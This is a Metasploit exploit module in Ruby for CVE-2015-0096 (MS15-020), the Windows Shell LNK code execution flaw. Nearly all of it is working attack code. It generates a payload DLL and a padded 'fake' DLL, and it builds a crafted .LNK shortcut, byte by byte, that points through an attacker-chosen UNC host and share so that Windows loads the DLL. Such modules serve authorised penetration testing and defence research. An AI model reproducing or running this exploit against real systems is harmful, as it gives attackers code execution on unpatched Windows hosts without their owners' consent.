# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE

  attr_accessor :dll_base_name
  attr_accessor :exploit_dll_base_name

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;      => &#039;Microsoft Windows Shell LNK Code Execution&#039;,
      &#039;Description&#039;  => %q{
        This module exploits a vulnerability in the MS10-046 patch to abuse (again) the handling
        of Windows Shortcut files (.LNK) that contain an icon resource pointing to a malicious
        DLL. This module creates the required files to exploit the vulnerability. They must be
        uploaded to an UNC path accessible by the target. This module has been tested successfully
        on Windows 2003 SP2 with MS10-046 installed and Windows 2008 SP2 (32 bits) with MS14-027
        installed.
      },
      &#039;Author&#039;    =>
        [
          &#039;Michael Heerklotz&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # msf module
        ],
      &#039;License&#039;    => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2015-0096&#039;],
          [&#039;MSB&#039;, &#039;MS15-020&#039;],
          [&#039;URL&#039;, &#039;http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Full-details-on-CVE-2015-0096-and-the-failed-MS10-046-Stuxnet/ba-p/6718459#.VQBOymTF9so&#039;],
          [&#039;URL&#039;, &#039;https://github.com/rapid7/metasploit-framework/pull/4911&#039;] # How to guide here
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Payload&#039;    =>
        {
          &#039;Space&#039;  => 2048,
        },
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;Targets&#039;    =>
        [
          [&#039;Automatic&#039;,  { }]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 10 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [true, &#039;The LNK file&#039;, &#039;msf.lnk&#039;]),
        OptString.new(&#039;UNCHOST&#039;, [true, &#039;The host portion of the UNC path to provide to clients (ex: 1.2.3.4).&#039;]),
        OptString.new(&#039;UNCSHARE&#039;, [true, &#039;The share folder portion of the UNC path to provide to clients (ex: share).&#039;]),
      ], self.class)
  end

  def smb_host
    "\\\\#{datastore[&#039;UNCHOST&#039;]}\\#{datastore[&#039;UNCSHARE&#039;]}\\"
  end

  def exploit_dll_filename
    name_length = 257 - (smb_host.length + 4 + 2)

    self.dll_base_name = dll_base_name || rand_text_alpha(1)
    self.exploit_dll_base_name = exploit_dll_base_name || rand_text_alpha(name_length)

    "#{dll_base_name} #{exploit_dll_base_name}.dll"
  end

  def dll_filename
    self.dll_base_name = dll_base_name || rand_text_alpha(1)

    "#{dll_base_name}.dll"
  end

  def create_exploit_file(file_name, data)
    unless ::File.directory?(Msf::Config.local_directory)
      FileUtils.mkdir_p(Msf::Config.local_directory)
    end
    path = File.join(Msf::Config.local_directory, file_name)
    full_path = ::File.expand_path(path)
    File.open(full_path, &#039;wb&#039;) { |fd| fd.write(data) }

    full_path
  end

  def dll_create(data)
    full_path = create_exploit_file(dll_filename, data)

    print_good "DLL with payload stored at #{full_path}"
  end

  def exploit_dll_create(data)
    full_path = create_exploit_file(exploit_dll_filename, data)

    print_good "Fake dll to exploit stored at #{full_path}"
  end

  def exploit
    dll = generate_payload_dll
    dll_create(dll)
    exploit_dll_create(dll)

    lnk = generate_link("#{smb_host}#{exploit_dll_filename}")
    file_create(lnk)
  end

  # stolen from ms10_046_shortcut_icon_dllloader, all the credits to the original authors: &#039;hdm&#039;, &#039;jduck&#039;, &#039;B_H&#039;
  def generate_link(unc)
    uni_unc = unc.unpack(&#039;C*&#039;).pack(&#039;v*&#039;)
    path = &#039;&#039;
    path << [
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ].pack(&#039;C*&#039;)
    path << uni_unc

    # LinkHeader
    ret = [
      0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x46, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ].pack(&#039;C*&#039;)

    idlist_data = &#039;&#039;
    idlist_data << [0x12 + 2].pack(&#039;v&#039;)
    idlist_data << [
      0x1f, 0x00, 0xe0, 0x4f, 0xd0, 0x20, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xd8, 0x08, 0x00, 0x2b, 0x30,
      0x30, 0x9d
    ].pack(&#039;C*&#039;)
    idlist_data << [0x12 + 2].pack(&#039;v&#039;)
    idlist_data << [
      0x2e, 0x1e, 0x20, 0x20, 0xec, 0x21, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xdd, 0x08, 0x00, 0x2b, 0x30,
      0x30, 0x9d
    ].pack(&#039;C*&#039;)
    idlist_data << [path.length + 2].pack(&#039;v&#039;)
    idlist_data << path
    idlist_data << [0x00].pack(&#039;v&#039;) # TERMINAL WOO

    # LinkTargetIDList
    ret << [idlist_data.length].pack(&#039;v&#039;) # IDListSize
    ret << idlist_data

    # ExtraData blocks (none)
    ret << [rand(4)].pack(&#039;V&#039;)

    # Patch in the LinkFlags
    ret[0x14, 4] = [&#039;10000001000000000000000000000000&#039;.to_i(2)].pack(&#039;N&#039;)

    ret
  end
end

